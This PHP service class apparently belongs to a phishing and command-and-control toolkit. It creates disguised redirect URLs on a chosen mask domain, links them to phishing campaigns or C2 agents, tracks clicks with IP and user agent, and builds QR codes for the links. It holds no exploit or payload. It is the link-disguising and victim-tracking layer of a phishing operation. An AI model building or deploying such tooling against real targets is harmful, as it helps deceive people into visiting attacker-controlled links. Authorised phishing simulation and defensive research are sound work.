<?php
namespace App\Services;

use App\Models\MaskedUrl;
use App\Models\PhishingCampaign;
use App\Models\C2Agent;

class UrlMaskerService
{
    public static function generateMaskedUrl($original, $maskDomain, $campaignId = null, $agentId = null)
    {
        $token = bin2hex(random_bytes(8));
        $masked = "https://{$maskDomain}/go/{$token}";
        $data = [
            'original_url' => $original,
            'masked_url' => $masked,
            'token' => $token,
            'campaign_id' => $campaignId,
            'agent_id' => $agentId
        ];
        $id = MaskedUrl::create($data);
        return ['id' => $id, 'masked_url' => $masked, 'token' => $token];
    }

    public static function trackClick($token, $ip, $userAgent)
    {
        $url = MaskedUrl::where('token', $token);
        if ($url) {
            $url = $url[0];
            $clicks = ($url['clicks'] ?? 0) + 1;
            MaskedUrl::update($url['id'], ['clicks' => $clicks, 'last_click' => date('Y-m-d H:i:s')]);
            // Store click metadata (geolocation – we can use ip-api.com)
            // For demo, just log.
            return $url;
        }
        return null;
    }

    public static function generateQRCode($data)
    {
        // Use Google Charts API for QR generation (simple)
        $size = '200x200';
        $qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size={$size}&data=" . urlencode($data);
        return $qrUrl;
    }
}
